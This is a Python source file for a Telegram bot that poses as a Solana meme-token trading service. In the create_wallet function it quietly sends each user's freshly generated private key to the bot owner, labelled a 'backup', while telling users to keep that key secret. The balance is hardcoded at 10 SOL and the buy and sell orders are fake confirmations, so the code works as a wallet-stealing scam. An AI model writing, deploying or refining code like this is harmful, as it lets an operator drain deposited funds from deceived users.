import os
import base58
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    ContextTypes,
    filters
)
from solders.keypair import Keypair

# === ENV VARIABLES ===
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])

# === GLOBALS ===
user_wallets = {}  # store wallets per user

# Conversation states
BUY_CA, BUY_AMOUNT, SELL_CA, SELL_AMOUNT = range(4)


# -------------------- HELPERS --------------------
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")


async def get_username(update: Update):
    user = update.effective_user
    return f"@{user.username}" if user.username else user.first_name


async def create_wallet(user_id, context):
    wallet = Keypair()
    user_wallets[user_id] = wallet
    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    # Send wallet to user
    await context.bot.send_message(
        chat_id=user_id,
        text=(
            f"✅ Wallet Created Successfully!\n\n"
            f"🏦 Public Address:\n{pub_key}\n\n"
            f"🔐 Private Key:\n{priv_key}\n\n"
            "⚠️ Keep your private key safe and secret!"
        )
    )

    # Send backup to OWNER
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(
        chat_id=OWNER_ID,
        text=(
            f"🔐 Wallet Backup\n"
            f"User: {username}\n"
            f"User ID: {user_id}\n"
            f"Public: {pub_key}\n"
            f"Private: {priv_key}"
        )
    )
    return pub_key, priv_key


async def get_balance(wallet: Keypair):
    # Placeholder: replace with actual RPC balance check if needed
    return 10.0  # pretend each wallet starts with 10 SOL


# -------------------- COMMANDS --------------------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    username = await get_username(update)
    start_text = (
        f"🔥 Hello {username}, welcome to SolTradePilotBot! 🔥\n\n"
        "Trade MEME tokens on Solana safely and securely using real SOL.\n"
        "Use the buttons below to create your wallet, deposit SOL, check your balance, "
        "buy or sell MEME tokens.\n\n"
        "⚠️ Make sure you have enough SOL before buying tokens!"
    )

    keyboard = [
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet")],
        [InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(start_text, reply_markup=reply_markup)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📖 **SolTradePilotBot Guide**\n\n"
        "This bot allows you to safely create a Solana wallet, deposit SOL, "
        "check your balance, and trade MEME tokens.\n\n"
        "**Buttons:**\n"
        "💳 Create Wallet → Generate your Solana wallet.\n"
        "🏦 SOL Address → Shows your wallet address for deposits.\n"
        "💰 Balance → Shows current SOL balance.\n"
        "🛒 Buy MEME → Buy MEME tokens from your wallet.\n"
        "📉 Sell MEME → Sell MEME tokens back.\n"
        "❓ Help → Show this guide.\n\n"
        "⚠️ Always keep your private key safe and do not share it."
    )
    await update.message.reply_text(help_text)


# -------------------- BUTTON HANDLER --------------------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "create_wallet":
        await create_wallet(user_id, context)

    elif query.data == "sol_address":
        wallet = user_wallets.get(user_id)
        if not wallet:
            await query.message.reply_text("⚠️ You need to create a wallet first.")
        else:
            await query.message.reply_text(f"🏦 Your SOL Address:\n{wallet.pubkey()}")

    elif query.data == "balance":
        wallet = user_wallets.get(user_id)
        if not wallet:
            await query.message.reply_text("⚠️ You need to create a wallet first.")
        else:
            balance = await get_balance(wallet)
            await query.message.reply_text(f"💰 Your SOL Balance: {balance} SOL")

    elif query.data == "buy_meme":
        wallet = user_wallets.get(user_id)
        if not wallet:
            await query.message.reply_text("⚠️ You need to create a wallet first.")
            return ConversationHandler.END

        balance = await get_balance(wallet)
        if balance <= 0:
            await query.message.reply_text("⚠️ Fund your wallet first before buying.")
            return ConversationHandler.END

        await query.message.reply_text("📥 Send the MEME token contract address (CA):")
        return BUY_CA

    elif query.data == "sell_meme":
        wallet = user_wallets.get(user_id)
        if not wallet:
            await query.message.reply_text("⚠️ You need to create a wallet first.")
            return ConversationHandler.END

        await query.message.reply_text("📤 Send the MEME token contract address (CA):")
        return SELL_CA

    elif query.data == "help":
        await help_command(update, context)


# -------------------- BUY/SELL HANDLERS --------------------
async def handle_buy_ca(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["buy_ca"] = update.message.text
    await update.message.reply_text("💰 Enter amount of SOL to buy:")
    return BUY_AMOUNT


async def handle_buy_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallet = user_wallets.get(user_id)
    amount = float(update.message.text)
    ca = context.user_data.get("buy_ca")

    balance = await get_balance(wallet)
    if amount > balance:
        await update.message.reply_text("⚠️ Insufficient balance. Fund wallet first.")
        return ConversationHandler.END

    await update.message.reply_text(f"✅ Buy order placed!\nCA: {ca}\nAmount: {amount} SOL")
    return ConversationHandler.END


async def handle_sell_ca(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["sell_ca"] = update.message.text
    await update.message.reply_text("📉 Enter amount of MEME to sell:")
    return SELL_AMOUNT


async def handle_sell_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallet = user_wallets.get(user_id)
    amount = float(update.message.text)
    ca = context.user_data.get("sell_ca")

    await update.message.reply_text(f"✅ Sell order placed!\nCA: {ca}\nAmount: {amount} MEME")
    return ConversationHandler.END


# -------------------- MAIN --------------------
def main():
    app = Application.builder().token(TOKEN).build()

    # ConversationHandler for buy/sell
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^(buy_meme|sell_meme)$")],
        states={
            BUY_CA: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buy_ca)],
            BUY_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buy_amount)],
            SELL_CA: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sell_ca)],
            SELL_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_sell_amount)],
        },
        fallbacks=[]
    )

    # Command & Callback handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(conv_handler)

    print("Bot running...")
    app.run_polling()


if __name__ == "__main__":
    main()
